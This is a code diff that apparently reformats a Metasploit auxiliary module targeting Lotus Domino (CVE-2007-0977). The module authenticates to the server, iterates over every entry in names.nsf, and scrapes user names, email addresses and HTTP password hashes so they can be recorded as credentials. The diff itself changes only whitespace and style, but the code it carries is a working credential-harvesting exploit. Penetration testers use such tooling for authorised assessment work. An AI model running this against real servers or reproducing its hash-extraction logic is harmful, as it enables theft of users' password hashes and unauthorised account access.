@@ -10,22 +10,22 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'           => 'Lotus Domino Password Hash Collector',
-      'Description'    => 'Get users passwords hashes from names.nsf page',
-      'Author'         => 'Tiago Ferreira <tiago.ccna[at]gmail.com>',
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
-          ['CVE' , '2007-0977']
-        ]
+      'Name' => 'Lotus Domino Password Hash Collector',
+      'Description' => 'Get users passwords hashes from names.nsf page',
+      'Author' => 'Tiago Ferreira <tiago.ccna[at]gmail.com>',
+      'License' => MSF_LICENSE,
+      'References' => [
+        ['CVE', '2007-0977']
+      ]
     )
 
-  register_options(
-    [
-      OptString.new('NOTES_USER', [false, 'The username to authenticate as', '']),
-      OptString.new('NOTES_PASS', [false, 'The password for the specified username' ]),
-      OptString.new('URI', [false, 'Define the path to the names.nsf file', '/names.nsf'])
-    ])
+    register_options(
+      [
+        OptString.new('NOTES_USER', [false, 'The username to authenticate as', '']),
+        OptString.new('NOTES_PASS', [false, 'The password for the specified username' ]),
+        OptString.new('URI', [false, 'Define the path to the names.nsf file', '/names.nsf'])
+      ]
+    )
   end
 
   def post_auth?
@@ -42,8 +42,8 @@ class MetasploitModule < Msf::Auxiliary
 
       begin
         res = send_request_raw({
-          'method'  => 'GET',
-          'uri'     => "#{@uri}\/$defaultview?Readviewentries",
+          'method' => 'GET',
+          'uri' => "#{@uri}\/$defaultview?Readviewentries",
         }, 25)
 
         if res.nil?
@@ -66,7 +66,6 @@ class MetasploitModule < Msf::Auxiliary
           return :abort
 
         end
-
       rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
       rescue ::Timeout::Error, ::Errno::EPIPE
       end
@@ -81,11 +80,10 @@ class MetasploitModule < Msf::Auxiliary
     post_data = "username=#{Rex::Text.uri_encode(user.to_s)}&password=#{Rex::Text.uri_encode(pass.to_s)}&RedirectTo=%2Fnames.nsf"
 
     begin
-
       res = send_request_cgi({
-        'method'  => 'POST',
-        'uri'     => '/names.nsf?Login',
-        'data'    => post_data
+        'method' => 'POST',
+        'uri' => '/names.nsf?Login',
+        'data' => post_data
       }, 20)
 
       if res.nil?
@@ -114,7 +112,6 @@ class MetasploitModule < Msf::Auxiliary
         print_error("#{peer} - Lotus Domino - Unrecognized #{res.code} response")
         return :abort
       end
-
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
     rescue ::Timeout::Error, ::Errno::EPIPE
     end
@@ -123,18 +120,18 @@ class MetasploitModule < Msf::Auxiliary
   def get_views(cookie, uri)
     begin
       res = send_request_raw({
-        'method'  => 'GET',
-        'uri'     => "#{uri}\/$defaultview?Readviewentries",
-        'cookie'  => cookie
+        'method' => 'GET',
+        'uri' => "#{uri}\/$defaultview?Readviewentries",
+        'cookie' => cookie
       }, 25)
       if res && res.body
         max = res.body.scan(/siblings=\"(.*)\"/).first.join
 
         1.upto(max.to_i) do |i|
           res = send_request_raw({
-            'method'  => 'GET',
-            'uri'     => "#{uri}\/$defaultview?Readviewentries&Start=#{i}",
-            'cookie'  => cookie
+            'method' => 'GET',
+            'uri' => "#{uri}\/$defaultview?Readviewentries&Start=#{i}",
+            'cookie' => cookie
           }, 25)
 
           view_id = res.body.scan(/unid="([^\s]+)"/)[0].join
@@ -142,7 +139,6 @@ class MetasploitModule < Msf::Auxiliary
         end
 
       end
-
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
     rescue ::Timeout::Error, ::Errno::EPIPE
     end
@@ -151,15 +147,15 @@ class MetasploitModule < Msf::Auxiliary
   def dump_hashes(view_id, cookie, uri)
     begin
       res = send_request_raw({
-        'method'  => 'GET',
-        'uri'     => "#{uri}\/$defaultview/#{view_id}?OpenDocument",
-        'cookie'  => cookie
+        'method' => 'GET',
+        'uri' => "#{uri}\/$defaultview/#{view_id}?OpenDocument",
+        'cookie' => cookie
       }, 25)
 
       if res && res.body
         doc = res.get_html_document
-        short_name =  doc.xpath('//input[@name="ShortName"]/@value').text
-        user_mail =  doc.xpath('//input[@name="InternetAddress"]/@value').text
+        short_name = doc.xpath('//input[@name="ShortName"]/@value').text
+        user_mail = doc.xpath('//input[@name="InternetAddress"]/@value').text
         pass_hash = doc.xpath('//input[@name="$dspHTTPPassword" or @name="dspHTTPPassword"]/@value').first&.text
 
         short_name = 'NULL' if short_name.to_s.strip.empty?
@@ -182,15 +178,13 @@ class MetasploitModule < Msf::Auxiliary
           )
         end
       end
-
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
     rescue ::Timeout::Error, ::Errno::EPIPE
     end
   end
 
   def report_cred(opts)
-
-    service_data = service_details.merge({workspace_id: myworkspace_id})
+    service_data = service_details.merge({ workspace_id: myworkspace_id })
 
     credential_data = {
       origin_type: :service,
